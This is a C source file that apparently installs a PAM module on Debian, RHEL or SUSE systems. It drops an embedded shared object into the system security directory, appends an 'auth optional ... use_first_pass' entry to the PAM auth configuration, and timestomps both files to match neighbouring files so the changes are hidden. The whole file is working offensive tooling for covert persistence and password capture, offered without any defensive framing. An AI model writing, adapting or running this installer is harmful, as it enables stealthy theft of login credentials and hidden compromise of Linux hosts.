#include <dirent.h>
#include <errno.h>
#include <libgen.h>
#include <sys/stat.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <utime.h>

// precompiled headers
#include <mod_precompiled.h>  // c_PamModule

// debug logging
#ifdef DEBUG
    #define DEBUG_LOG(...) printf(__VA_ARGS__)
#else
    #define DEBUG_LOG(...)
#endif

typedef enum
{
    NONE,
    DEBIAN,
    RHEL,
    SUSE,
} distro_t;

// stampable values - configured via web interface or helper script
static const char c_mod_name[128] = "BASKETBALLJONES";

//
// guess reasonable mtime timestamp for a file (uses closest matching filename)
//
time_t best_mtime(const char *filepath)
{
    time_t best_time = 0;
    char *dirname = strdup(filepath);
    char *basename = NULL;
    
    if (NULL != dirname)
    {
        struct dirent **names = NULL;
        int num_names = 0;
        char *slash_idx = NULL;
        int base_len = 0;

        DEBUG_LOG("finding timestamp match for %s\n", filepath);

        // parse the dirname and basename
        slash_idx = strrchr(filepath, '/');
        basename = slash_idx + 1;
        base_len = strlen(basename);

        slash_idx = strrchr(dirname, '/');
        *slash_idx = '\0';
       
        num_names = scandir(dirname, &names, NULL, alphasort);
        if (-1 != num_names)
        {
            // start at -1 to allow /. (current dir) as a default
            int most_matched = -1;
            for (int idx=0; idx < num_names; idx++)
            {
                char *curr_name = names[idx]->d_name;
                int curr_len = strlen(curr_name);
                int min_len = curr_len < base_len ? curr_len : base_len;

                int curr = 0;
                for (; (curr < min_len) && (curr_name[curr] == basename[curr]); curr++);
                if (curr > most_matched)
                {
                    char fullpath[258] = {0};
                    struct stat sb = {0};

                    snprintf(fullpath, sizeof(fullpath), "%s/%s", dirname, curr_name);
                    if (0 == stat(fullpath, &sb))
                    {
                        DEBUG_LOG("    best match so far: %s\n", fullpath);
                        most_matched = curr;
                        best_time = sb.st_mtime;
                    }
                }
                // assume alphabetical order means best match should increase to a global max
                else if (most_matched > 0)
                {
                    break;
                }
            }
            free(names);
        }
        free(dirname);
    }

    return best_time;
}

//
// drop the pam module to disk
//
int drop_pam_mod(distro_t distro)
{
    int retval = -1;

    if (distro)
    {
        char mod_path[128] = {0};

        switch(distro)
        {
        case DEBIAN:
            snprintf(mod_path, sizeof(mod_path) - 1, "/lib/x86_64-linux-gnu/security/%s.so", c_mod_name);
            break;
        case RHEL:
            snprintf(mod_path, sizeof(mod_path) - 1, "/usr/lib64/security/%s.so", c_mod_name);
            break;
        case SUSE:
            snprintf(mod_path, sizeof(mod_path) - 1, "/lib64/security/%s.so", c_mod_name);
            break;
        default:
            break;
        }

        time_t best_timestamp = best_mtime(mod_path);
        if (0 != best_timestamp)
        {
            FILE *pam_mod = fopen(mod_path, "w");
            if (NULL != pam_mod)
            {
                struct utimbuf times = {best_timestamp, best_timestamp};
                size_t written = fwrite((void *)c_PamModule, sizeof(char), sizeof(c_PamModule), pam_mod);
                fclose(pam_mod);

                if (written == sizeof(c_PamModule))
                {
                    // TODO: proper file permissions seem to vary by distro?
                    if (0 == chmod(mod_path, (S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH)))
                    {
                        DEBUG_LOG("Dropped pam module : %s\n", mod_path);

                        retval = 0;  // install has been successful - timestamp fix is optional
                    }
                    if (0 == utime(mod_path, &times))
                    {
                        DEBUG_LOG("Set timestamps for %s\n", mod_path);
                    }
                }
            }
        }
    }

    return retval;
}


//
// add the pam module to the specified auth stack config
//
int config_auth_stack(distro_t distro)
{
    int retval = -1;
    
    if (distro)
    {
        char *conf_path = NULL;

        switch(distro)
        {
        case DEBIAN:
            conf_path = "/etc/pam.d/common-auth";
            break;
        case RHEL:
            conf_path = "/etc/pam.d/password-auth";
            break;
        case SUSE:
            conf_path = "TODO";
            break;
        default:
            break;
        }

        time_t timestamp = best_mtime(conf_path);
        if (timestamp)
        {
            FILE *pam_conf = fopen(conf_path, "a");
            if (pam_conf)
            {
                char entry[128] = {0};
                struct utimbuf times = {timestamp, timestamp};

                // TODO: figure out where to insert the modules in each stack
                int written =
                        fprintf(pam_conf, "\nauth    optional                        %s.so use_first_pass", c_mod_name);
                fclose(pam_conf);

                if (written > 0)
                {
                    DEBUG_LOG("Added %s.so to %s\n", c_mod_name, conf_path);
                    
                    retval = 0;  // install has been successful - timestamp fix is optional

                    if (0 == utime(conf_path, &times))
                    {
                        DEBUG_LOG("Set timestamps for %s\n", conf_path);
                    }
                }
            }
        }
    }

    return retval;
}

int main()
{
    int retval = -1;

    distro_t distro = NONE;
    FILE *os_release = fopen("/etc/os-release", "r");
    if (NULL != os_release)
    {
        char os_buf[256] = {0};
        size_t read = fread(os_buf, sizeof(char), sizeof(os_buf), os_release);
        fclose(os_release);

        if (read)
        {
            if (NULL != strstr(os_buf, "debian"))
            {
                distro = DEBIAN;
            }
            else if (NULL != strstr(os_buf, "rhel"))
            {
                distro = RHEL;
            }
            else if (NULL != strstr(os_buf, "suse"))
            {
                distro = SUSE;
            }
        }
    }
    if (distro)
    {
        if (0 == drop_pam_mod(distro))
        {
            if (0 == config_auth_stack(distro))
            {
                DEBUG_LOG("PAM mod installed!\n");
                retval = 0;
            }
        }
    }

    return retval;
}